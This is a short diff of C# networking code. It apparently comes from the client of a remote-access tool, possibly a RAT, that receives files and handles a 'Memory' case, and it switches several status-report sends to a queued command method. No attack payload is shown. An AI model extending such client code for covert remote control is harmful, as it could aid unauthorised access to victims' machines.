@@ -52,7 +52,7 @@ namespace Axeno.Client.Networking.Functions.Networking
                             MsgPack mpack = new MsgPack();
                             mpack.ForcePathObject("Packet").AsString = "FileSender";
                             mpack.ForcePathObject("Result").AsString = "Success";
-                            ClientSocket.Send(mpack.Encode2Bytes());
+                            ClientSocket.QueueCommand(mpack.Encode2Bytes());
                             break;
                         }
                     case "Memory":
@@ -76,7 +76,7 @@ namespace Axeno.Client.Networking.Functions.Networking
                                         MsgPack mpack = new MsgPack();
                                         mpack.ForcePathObject("Packet").AsString = "FileSender";
                                         mpack.ForcePathObject("Result").AsString = "Failure";
-                                        ClientSocket.Send(mpack.Encode2Bytes());
+                                        ClientSocket.QueueCommand(mpack.Encode2Bytes());
                                         return;
                                     }
                                 })
@@ -91,7 +91,7 @@ namespace Axeno.Client.Networking.Functions.Networking
                 MsgPack mpack = new MsgPack();
                 mpack.ForcePathObject("Packet").AsString = "FileSender";
                 mpack.ForcePathObject("Result").AsString = "Failure";
-                ClientSocket.Send(mpack.Encode2Bytes());
+                ClientSocket.QueueCommand(mpack.Encode2Bytes());
             }
         }
     }
